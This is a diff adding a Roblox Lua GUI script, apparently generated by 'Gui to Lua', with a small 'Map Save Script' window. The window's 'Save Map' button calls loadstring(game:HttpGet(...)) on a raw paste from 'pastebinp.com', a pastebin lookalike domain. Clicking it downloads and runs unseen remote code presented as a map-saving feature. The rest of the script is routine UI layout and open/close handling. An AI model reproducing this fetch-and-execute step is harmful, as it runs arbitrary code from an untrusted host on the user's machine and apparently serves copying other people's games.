@@ -1,0 +1,123 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local main1 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local close = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local savemap = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local opem = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main1.Name = "main1"
+main1.Parent = ScreenGui
+main1.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+main1.Position = UDim2.new(0.37453258, 0, 0.301859796, 0)
+main1.Size = UDim2.new(0, 274, 0, 164)
+
+UICorner.Parent = main1
+
+TextLabel.Parent = main1
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.135036498, 0, -0.0609756112, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.Code
+TextLabel.Text = "Map Save Script"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+close.Name = "close"
+close.Parent = main1
+close.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+close.Position = UDim2.new(0.916565299, 0, 0, 0)
+close.Size = UDim2.new(0, 22, 0, 19)
+close.Font = Enum.Font.SourceSans
+close.Text = "x"
+close.TextColor3 = Color3.fromRGB(255, 255, 255)
+close.TextSize = 14.000
+close.TextStrokeColor3 = Color3.fromRGB(85, 0, 0)
+
+UICorner_2.Parent = close
+
+savemap.Name = "savemap"
+savemap.Parent = main1
+savemap.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+savemap.Position = UDim2.new(0.135036498, 0, 0.347560972, 0)
+savemap.Size = UDim2.new(0, 200, 0, 25)
+savemap.Font = Enum.Font.SourceSans
+savemap.Text = "Save Map"
+savemap.TextColor3 = Color3.fromRGB(255, 255, 255)
+savemap.TextSize = 14.000
+
+UICorner_3.Parent = savemap
+
+opem.Name = "opem"
+opem.Parent = ScreenGui
+opem.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+opem.BorderColor3 = Color3.fromRGB(25, 25, 25)
+opem.Position = UDim2.new(0.0105763264, 0, 0.453181595, 0)
+opem.Size = UDim2.new(0, 170, 0, 31)
+opem.Font = Enum.Font.SourceSans
+opem.Text = "Open"
+opem.TextColor3 = Color3.fromRGB(255, 255, 255)
+opem.TextSize = 14.000
+
+UICorner_4.Parent = opem
+
+-- Scripts:
+
+local function JYAQX_fake_script() -- main1.LocalScript 
+	local script = Instance.new('LocalScript', main1)
+
+	local frame = script.Parent
+	local close = script.Parent.close
+	
+	close.MouseButton1Click:Connect(function()
+		frame.Visible = false
+	end)
+end
+coroutine.wrap(JYAQX_fake_script)()
+local function WRAMSSO_fake_script() -- savemap.LocalScript 
+	local script = Instance.new('LocalScript', savemap)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://pastebinp.com/raw/wfp0LkWb'))()
+	end)
+end
+coroutine.wrap(WRAMSSO_fake_script)()
+local function MNUPU_fake_script() -- ScreenGui.harket etdirme 
+	local script = Instance.new('Script', ScreenGui)
+
+	frame = script.Parent.main1
+	frame.Draggable = true
+	frame.Active = true
+	frame.Selectable = true
+end
+coroutine.wrap(MNUPU_fake_script)()
+local function VYFIU_fake_script() -- opem.LocalScript 
+	local script = Instance.new('LocalScript', opem)
+
+	local frame = script.Parent.Parent.main1
+	local open = false
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if frame.Visible == false then
+			frame.Visible = true
+		else
+			frame.Visible = false
+		end
+	end)
+	
+end
+coroutine.wrap(VYFIU_fake_script)()
